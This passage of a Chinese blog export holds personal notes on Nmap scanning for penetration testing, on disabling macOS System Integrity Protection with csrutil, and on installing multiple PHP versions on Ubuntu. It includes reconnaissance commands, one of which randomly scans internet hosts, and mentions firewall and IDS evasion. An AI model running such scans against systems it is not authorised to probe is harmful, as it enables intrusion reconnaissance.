title=\"Nmap脚本引擎(NSE)\"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测\n- 漏洞检测\n- 漏洞利用\n</code></pre><h4 id=\"端口状态说明\"><a href=\"#端口状态说明\" class=\"headerlink\" title=\"端口状态说明\"></a>端口状态说明</h4><ul>\n<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>\n</li>\n<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n</li>\n<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n</li>\n<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n</li>\n<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n</li>\n<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p><a href=\"http://www.91ri.org/8654.html\">http://www.91ri.org/8654.html</a></p>\n<h2 id=\"Nmap-介绍\"><a href=\"#Nmap-介绍\" class=\"headerlink\" title=\"Nmap 介绍\"></a>Nmap 介绍</h2><p><img src=\"http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG\" alt=\"功能架构图\"></p>\n<h3 id=\"四项基本功能\"><a href=\"#四项基本功能\" class=\"headerlink\" title=\"四项基本功能\"></a>四项基本功能</h3>","more":"<ul>\n<li><p>主机发现（Host Discovery）</p>\n</li>\n<li><p>端口扫描（Port Scanning）</p>\n</li>\n<li><p>版本侦测（Version Detection）</p>\n</li>\n<li><p>操作系统侦测（Operating System Detection）</p>\n<p>  而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>\n</li>\n</ul>\n<h2 id=\"基本使用\"><a href=\"#基本使用\" class=\"headerlink\" title=\"基本使用\"></a>基本使用</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    <span class=\"comment\"># 多主机地址扫描</span></div><div class=\"line\">nmap -A -T4 host        </div><div class=\"line\"><span class=\"comment\"># -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)</span></div><div class=\"line\"><span class=\"comment\"># -T4 指定扫描时序，总共6个级别(0-5),级别越高，速度越快，但容易被防火墙检测屏蔽。</span></div></pre></td></tr></table></figure>\n<h2 id=\"常规使用\"><a href=\"#常规使用\" class=\"headerlink\" title=\"\b常规使用\"></a>\b常规使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap IP/Hostname                    <span class=\"comment\"># 最基本的使用情况</span></div><div class=\"line\">nmap host1 host2 host3 etc...       <span class=\"comment\"># 扫描多主机</span></div><div class=\"line\">nmap 192.168.0.1-192.168.1.254      <span class=\"comment\"># 扫描IP地址段</span></div><div class=\"line\">nmap 192.168.0.1/23                 <span class=\"comment\"># CIDR格式的网络地址段（与上一条命令等同）</span></div><div class=\"line\">nmap -iL list.txt                   <span class=\"comment\"># \b扫描目标主机列表</span></div><div class=\"line\">nmap -Pn host                       <span class=\"comment\"># \b假定目标存活</span></div></pre></td></tr></table></figure>\n<h2 id=\"高级使用\"><a href=\"#高级使用\" class=\"headerlink\" title=\"高级使用\"></a>高级使用</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap -A host                        <span class=\"comment\"># ？？？？？？？</span></div></pre></td></tr></table></figure>\n<h2 id=\"—\"><a href=\"#—\" class=\"headerlink\" title=\"—\"></a>—</h2><hr>\n<h2 id=\"渗透测试中不常用-我反正没用过\"><a href=\"#渗透测试中不常用-我反正没用过\" class=\"headerlink\" title=\"渗透测试中不常用(我反正没用过)\"></a>渗透测试中不常用(我反正没用过)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap 192.168.1.0/24 --exclude 192.168.1.11  <span class=\"comment\"># 排除一些主机</span></div><div class=\"line\">nmap -iR 100                        <span class=\"comment\"># \b随机扫描互联网上100个主机</span></div><div class=\"line\">nmap -Sp                            <span class=\"comment\"># 只ping扫描，</span></div><div class=\"line\">nmap -PS                            <span class=\"comment\"># TCP SYN scan (TCP SYN ping)</span></div><div class=\"line\">nmap -PA                            <span class=\"comment\"># TCP ACK scan ping</span></div><div class=\"line\">nmap -PU                            <span class=\"comment\"># UDP scan  ping</span></div><div class=\"line\">nmap -PY                            <span class=\"comment\"># ??? SCTP scan\b ping</span></div><div class=\"line\">nmap -PE/PP/PM                      <span class=\"comment\"># ??? ICMP echo/timestamp/netmask request discovery probes  什么鬼？</span></div><div class=\"line\">nmap -PO [protocol] host            <span class=\"comment\"># 指定协议ping</span></div><div class=\"line\">nmap -PR                            <span class=\"comment\"># ??? ARP ping </span></div><div class=\"line\">nmap --traceroute                   <span class=\"comment\"># traceroute 功能 探测网络路径</span></div><div class=\"line\">nmap -n/-R                          <span class=\"comment\"># Never do DNS resolution/Always resolve [default: sometimes]</span></div><div class=\"line\">nmap --dns-servers serv1,serv2,,,   <span class=\"comment\"># 指定DNS</span></div><div class=\"line\">nmap --system-dns                   <span class=\"comment\"># 使用系统DNS</span></div><div class=\"line\">nmap <span class=\"_\">-s</span>L IPs                        <span class=\"comment\"># 列出IPs\b的反向DNS结果</span></div><div class=\"line\">nmap</div></pre></td></tr></table></figure>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p><a href=\"http://resources.infosecinstitute.com/nmap-cheat-sheet/\">Introduction to Nmap</a></p>\n<p><a href=\"http://www.freebuf.com/articles/network/32302.html\">Nmap从探测到漏洞利用备忘录 – Nmap简介(一)</a></p>\n<h2 id=\"零散知识\"><a href=\"#零散知识\" class=\"headerlink\" title=\"#\b零散\b\b知识\"></a>#\b零散\b\b知识</h2><h4 id=\"Nmap脚本引擎-NSE\"><a href=\"#Nmap脚本引擎-NSE\" class=\"headerlink\" title=\"Nmap脚本引擎(NSE)\"></a>Nmap脚本引擎(NSE)</h4><pre><code>- 网络探测\n- 漏洞检测\n- 漏洞利用\n</code></pre><h4 id=\"端口状态说明\"><a href=\"#端口状态说明\" class=\"headerlink\" title=\"端口状态说明\"></a>端口状态说明</h4><ul>\n<li><p>Open(开放的): 应用程序正在这个端口上监听连接。</p>\n</li>\n<li><p>Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</p>\n</li>\n<li><p>Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</p>\n</li>\n<li><p>Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。</p>\n</li>\n<li><p>Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。</p>\n</li>\n<li><p>Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。</p>\n</li>\n</ul>"},{"title":"MacOS - SIP (System Integrity Protection) 系统集成保护","date":"2017-04-26T11:19:03.000Z","_content":"# Mac - SIP 系统集成保护\n官方资料[About System Integrity Protection on your Mac](https://support.apple.com/en-us/HT204899)\n\n## 开启/关闭SIP\n参考来源 [http://www.jianshu.com/p/0572336a0771](http://www.jianshu.com/p/0572336a0771)\n### 1.进入Recovery Mode\n开机按住command+R\n\n### 2.使用csrutil命令\n<!-- more -->\n打开终端Terminal，键入csrutil可以显示该命令的使用方法\n```bash\n➜  ~ csrutil\nusage: csrutil <command>\nModify the System Integrity Protection configuration. All configuration changes apply to the entire machine.\nAvailable commands:\n\n    clear\n        Clear the existing configuration. Only available in Recovery OS.\n    disable\n        Disable the protection on the machine. Only available in Recovery OS.\n    enable\n        Enable the protection on the machine. Only available in Recovery OS.\n    status\n        Display the current configuration.\n\n    netboot\n        add <address>\n            Insert a new IPv4 address in the list of allowed NetBoot sources.\n        list\n            Print the list of allowed NetBoot sources.\n        remove <address>\n            Remove an IPv4 address from the list of allowed NetBoot sources.\n```\n正常系统模式下仅可以用status命令查询SIP状态\n\n### 3.常用参数\nclear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)\n\ndisable：关闭SIP(仅在恢复模式下有效)\n\nenable：开启SIP(仅在恢复模式下有效)\n\nstatus：查询SIP状态\n\n### 4.常用参数进阶\n\n除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下\n```bash\ncsrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]\n# 单项使用：\nsudo csrutil enable –without fs：Filesystem Protections disable\nsudo csrutil enable –without kext：Kext Signing disable\nsudo csrutil enable –without debug：Debugging Restrictions disable\nsudo csrutil enable –without nvram：NVRAM Protections disable\nsudo csrutil enable –without dtrace：DTrace Restrictions disable\n# 组合使用：\nsudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled\n```\n\n## mac下使用proxychains-ng实现代理\n由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。","source":"_posts/Mac-SIP.md","raw":"---\ntitle: MacOS - SIP (System Integrity Protection) 系统集成保护\ndate: 2017-04-26 19:19:03\ntags: \n---\n# Mac - SIP 系统集成保护\n官方资料[About System Integrity Protection on your Mac](https://support.apple.com/en-us/HT204899)\n\n## 开启/关闭SIP\n参考来源 [http://www.jianshu.com/p/0572336a0771](http://www.jianshu.com/p/0572336a0771)\n### 1.进入Recovery Mode\n开机按住command+R\n\n### 2.使用csrutil命令\n<!-- more -->\n打开终端Terminal，键入csrutil可以显示该命令的使用方法\n```bash\n➜  ~ csrutil\nusage: csrutil <command>\nModify the System Integrity Protection configuration. All configuration changes apply to the entire machine.\nAvailable commands:\n\n    clear\n        Clear the existing configuration. Only available in Recovery OS.\n    disable\n        Disable the protection on the machine. Only available in Recovery OS.\n    enable\n        Enable the protection on the machine. Only available in Recovery OS.\n    status\n        Display the current configuration.\n\n    netboot\n        add <address>\n            Insert a new IPv4 address in the list of allowed NetBoot sources.\n        list\n            Print the list of allowed NetBoot sources.\n        remove <address>\n            Remove an IPv4 address from the list of allowed NetBoot sources.\n```\n正常系统模式下仅可以用status命令查询SIP状态\n\n### 3.常用参数\nclear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)\n\ndisable：关闭SIP(仅在恢复模式下有效)\n\nenable：开启SIP(仅在恢复模式下有效)\n\nstatus：查询SIP状态\n\n### 4.常用参数进阶\n\n除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下\n```bash\ncsrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]\n# 单项使用：\nsudo csrutil enable –without fs：Filesystem Protections disable\nsudo csrutil enable –without kext：Kext Signing disable\nsudo csrutil enable –without debug：Debugging Restrictions disable\nsudo csrutil enable –without nvram：NVRAM Protections disable\nsudo csrutil enable –without dtrace：DTrace Restrictions disable\n# 组合使用：\nsudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled\n```\n\n## mac下使用proxychains-ng实现代理\n由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。","slug":"Mac-SIP","published":1,"updated":"2017-06-08T13:04:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfr9000597uvfsc7f7xo","content":"<h1 id=\"Mac-SIP-系统集成保护\"><a href=\"#Mac-SIP-系统集成保护\" class=\"headerlink\" title=\"Mac - SIP 系统集成保护\"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href=\"https://support.apple.com/en-us/HT204899\" target=\"_blank\" rel=\"external\">About System Integrity Protection on your Mac</a></p>\n<h2 id=\"开启-关闭SIP\"><a href=\"#开启-关闭SIP\" class=\"headerlink\" title=\"开启/关闭SIP\"></a>开启/关闭SIP</h2><p>参考来源 <a href=\"http://www.jianshu.com/p/0572336a0771\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/0572336a0771</a></p>\n<h3 id=\"1-进入Recovery-Mode\"><a href=\"#1-进入Recovery-Mode\" class=\"headerlink\" title=\"1.进入Recovery Mode\"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>\n<h3 id=\"2-使用csrutil命令\"><a href=\"#2-使用csrutil命令\" class=\"headerlink\" title=\"2.使用csrutil命令\"></a>2.使用csrutil命令</h3><a id=\"more\"></a>\n<p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  ~ csrutil</div><div class=\"line\">usage: csrutil &lt;<span class=\"built_in\">command</span>&gt;</div><div class=\"line\">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class=\"line\">Available commands:</div><div class=\"line\"></div><div class=\"line\">    clear</div><div class=\"line\">        Clear the existing configuration. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">disable</span></div><div class=\"line\">        Disable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">enable</span></div><div class=\"line\">        Enable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    status</div><div class=\"line\">        Display the current configuration.</div><div class=\"line\"></div><div class=\"line\">    netboot</div><div class=\"line\">        add &lt;address&gt;</div><div class=\"line\">            Insert a new IPv4 address <span class=\"keyword\">in</span> the list of allowed NetBoot sources.</div><div class=\"line\">        list</div><div class=\"line\">            Print the list of allowed NetBoot sources.</div><div class=\"line\">        remove &lt;address&gt;</div><div class=\"line\">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>\n<p>正常系统模式下仅可以用status命令查询SIP状态</p>\n<h3 id=\"3-常用参数\"><a href=\"#3-常用参数\" class=\"headerlink\" title=\"3.常用参数\"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>\n<p>disable：关闭SIP(仅在恢复模式下有效)</p>\n<p>enable：开启SIP(仅在恢复模式下有效)</p>\n<p>status：查询SIP状态</p>\n<h3 id=\"4-常用参数进阶\"><a href=\"#4-常用参数进阶\" class=\"headerlink\" title=\"4.常用参数进阶\"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">csrutil <span class=\"built_in\">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class=\"line\"><span class=\"comment\"># 单项使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without fs：Filesystem Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext：Kext Signing <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without debug：Debugging Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without nvram：NVRAM Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without dtrace：DTrace Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\"><span class=\"comment\"># 组合使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>\n<h2 id=\"mac下使用proxychains-ng实现代理\"><a href=\"#mac下使用proxychains-ng实现代理\" class=\"headerlink\" title=\"mac下使用proxychains-ng实现代理\"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"Mac-SIP-系统集成保护\"><a href=\"#Mac-SIP-系统集成保护\" class=\"headerlink\" title=\"Mac - SIP 系统集成保护\"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href=\"https://support.apple.com/en-us/HT204899\">About System Integrity Protection on your Mac</a></p>\n<h2 id=\"开启-关闭SIP\"><a href=\"#开启-关闭SIP\" class=\"headerlink\" title=\"开启/关闭SIP\"></a>开启/关闭SIP</h2><p>参考来源 <a href=\"http://www.jianshu.com/p/0572336a0771\">http://www.jianshu.com/p/0572336a0771</a></p>\n<h3 id=\"1-进入Recovery-Mode\"><a href=\"#1-进入Recovery-Mode\" class=\"headerlink\" title=\"1.进入Recovery Mode\"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>\n<h3 id=\"2-使用csrutil命令\"><a href=\"#2-使用csrutil命令\" class=\"headerlink\" title=\"2.使用csrutil命令\"></a>2.使用csrutil命令</h3>","more":"<p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  ~ csrutil</div><div class=\"line\">usage: csrutil &lt;<span class=\"built_in\">command</span>&gt;</div><div class=\"line\">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class=\"line\">Available commands:</div><div class=\"line\"></div><div class=\"line\">    clear</div><div class=\"line\">        Clear the existing configuration. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">disable</span></div><div class=\"line\">        Disable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">enable</span></div><div class=\"line\">        Enable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    status</div><div class=\"line\">        Display the current configuration.</div><div class=\"line\"></div><div class=\"line\">    netboot</div><div class=\"line\">        add &lt;address&gt;</div><div class=\"line\">            Insert a new IPv4 address <span class=\"keyword\">in</span> the list of allowed NetBoot sources.</div><div class=\"line\">        list</div><div class=\"line\">            Print the list of allowed NetBoot sources.</div><div class=\"line\">        remove &lt;address&gt;</div><div class=\"line\">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>\n<p>正常系统模式下仅可以用status命令查询SIP状态</p>\n<h3 id=\"3-常用参数\"><a href=\"#3-常用参数\" class=\"headerlink\" title=\"3.常用参数\"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>\n<p>disable：关闭SIP(仅在恢复模式下有效)</p>\n<p>enable：开启SIP(仅在恢复模式下有效)</p>\n<p>status：查询SIP状态</p>\n<h3 id=\"4-常用参数进阶\"><a href=\"#4-常用参数进阶\" class=\"headerlink\" title=\"4.常用参数进阶\"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">csrutil <span class=\"built_in\">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class=\"line\"><span class=\"comment\"># 单项使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without fs：Filesystem Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext：Kext Signing <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without debug：Debugging Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without nvram：NVRAM Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without dtrace：DTrace Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\"><span class=\"comment\"># 组合使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>\n<h2 id=\"mac下使用proxychains-ng实现代理\"><a href=\"#mac下使用proxychains-ng实现代理\" class=\"headerlink\" title=\"mac下使用proxychains-ng实现代理\"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>"},{"title":"PHP多版本安装与切换(Ubuntu-16-04-LTS)","date":"2017-07-26T01:06:16.000Z","_content":">   打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。\n>   结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~\n<!-- more -->\n## PPA安装PHP\n### - 安装PHP 5.6\n```\n$ sudo apt-get install software-properties-common   # 安装PPA工具\n$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的\n$ sudo apt-get update\n$ sudo apt-get install -y php5.6\n```\n### - 安装PHP 7.1\n```\n$ sudo apt-get install python-software-properties\n$ sudo add-apt-repository ppa:ondrej/php\n$ sudo apt-get update\n$ sudo apt-get install -y php7.1                    \n```\n\n## PHP版本切换\n### PHP 5.6 => PHP 7.1\n```\nApache:-\n$ sudo a2dismod php5.6\n$ sudo a2enmod php7.1\n$ sudo service apache2 restart\n\nCLI:-\n$ update-alternatives --set php /usr/bin/php7.1\n```\n### PHP 7.1 => PHP 5.6\n```\nApache:-\n$ sudo a2dismod php7.1\n$ sudo a2enmod php5.6\n$ sudo service apache2 restart\n\nCLI:-\n$ sudo update-alternatives --set php /usr/bin/php5.6\n```\n## 使用phpBrew安装/切换PHP版本【失败】\n[https://github.com/phpbrew/phpbrew](https://github.com/phpbrew/phpbrew)\n\n```\n$ sudo apt-get update\n$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev\n\n# openssl成功安装的\n$ pkg-config --list-all | grep openssl\nopenssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools\n\n$ phpbrew install 5.5.38    # 出错！！！！\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's libraries\n\n----------------------\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n```\n\n>   各种无言以对，花了两整天时间，无法解决！","source":"_posts/PHP多版本安装与切换(Ubuntu-16-04-LTS).md","raw":"---\ntitle: PHP多版本安装与切换(Ubuntu-16-04-LTS)\ndate: 2017-07-26 09:06:16\ntags: PHP\n---\n>   打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。\n>   结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~\n<!-- more -->\n## PPA安装PHP\n### - 安装PHP 5.6\n```\n$ sudo apt-get install software-properties-common   # 安装PPA工具\n$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的\n$ sudo apt-get update\n$ sudo apt-get install -y php5.6\n```\n### - 安装PHP 7.1\n```\n$ sudo apt-get install python-software-properties\n$ sudo add-apt-repository ppa:ondrej/php\n$ sudo apt-get update\n$ sudo apt-get install -y php7.1                    \n```\n\n## PHP版本切换\n### PHP 5.6 => PHP 7.1\n```\nApache:-\n$ sudo a2dismod php5.6\n$ sudo a2enmod php7.1\n$ sudo service apache2 restart\n\nCLI:-\n$ update-alternatives --set php /usr/bin/php7.1\n```\n### PHP 7.1 => PHP 5.6\n```\nApache:-\n$ sudo a2dismod php7.1\n$ sudo a2enmod php5.6\n$ sudo service apache2 restart\n\nCLI:-\n$ sudo update-alternatives --set php /usr/bin/php5.6\n```\n## 使用phpBrew安装/切换PHP版本【失败】\n[https://github.com/phpbrew/phpbrew](https://github.com/phpbrew/phpbrew)\n\n```\n$ sudo apt-get update\n$ sudo apt-get install  php7.0 php7.0-cli php7.0-dev php7.0-curl php7.0-json php7.0-cgi php-pear autoconf automake curl build-essential openssl libssl-dev libcurl4-openssl-dev libxslt1-dev re2c libxml2 libxml2-dev bison libbz2-dev libreadline-dev libmhash2 libmhash-dev libmcrypt4 libmcrypt-dev\n\n# openssl成功安装的\n$ pkg-config --list-all | grep openssl\nopenssl              OpenSSL - Secure Sockets Layer and cryptography libraries and tools\n\n$ phpbrew install 5.5.38    # 出错！！！！\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's libraries\n\n----------------------\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n\n$ phpbrew install 5.5.38 -- --with-openssl=/usr/bin/openssl --with-openssl-dir=/usr/include/openssl/\n    checking for pkg-config... /usr/bin/pkg-config\n    configure: error: Cannot find OpenSSL's <evp.h>\n```\n\n>   各种无言以对，花了两整天时间，无法解决！","slug":"PHP多版本安装与切换(Ubuntu-16-04-LTS)","published":1,"updated":"2017-07-27T00:39:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfrh000897uvc9lttq49","content":"<blockquote>\n<p>  打算使用phpBrew来进行PHP版本管理，然而phpBrew的使用需要在Ubuntu 16上默认安装的PHP版本为5，却无法直接apt-get install php5，所以打算基于php7尝试使用。<br>  结果很悲剧，疑似pkg-config出问题了。 所以本文主要做一个记录，祭奠浪费掉的两整天时间。最后憋屈的使用PHPstudy了。 /(ㄒoㄒ)/~~<br><a id=\"more\"></a></p>\n<h2 id=\"PPA安装PHP\"><a href=\"#PPA安装PHP\" class=\"headerlink\" title=\"PPA安装PHP\"></a>PPA安装PHP</h2><h3 id=\"安装PHP-5-6\"><a href=\"#安装PHP-5-6\" class=\"headerlink\" title=\"- 安装PHP 5.6\"></a>- 安装PHP 5.6</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo apt-get install software-properties-common   # 安装PPA工具</div><div class=\"line\">$ sudo add-apt-repository ppa:ondrej/php            # ondrej这个哥们维护在launchpad上的</div><div class=\"line\">$ sudo apt-get update</div><div class=\"line\">$ sudo apt-get install -y php5.6</div></pre></td></tr></table></figure>\n</blockquote>\n<h3 id=\"安装PHP-7-1\"><a href=\"#安装PHP-7-1\" class=\"headerlink\" title=\"- 安装PHP 7.1\"></a>- 安装PHP 7.1</h3><figure class=\"highlight plain\"><table><tr><td 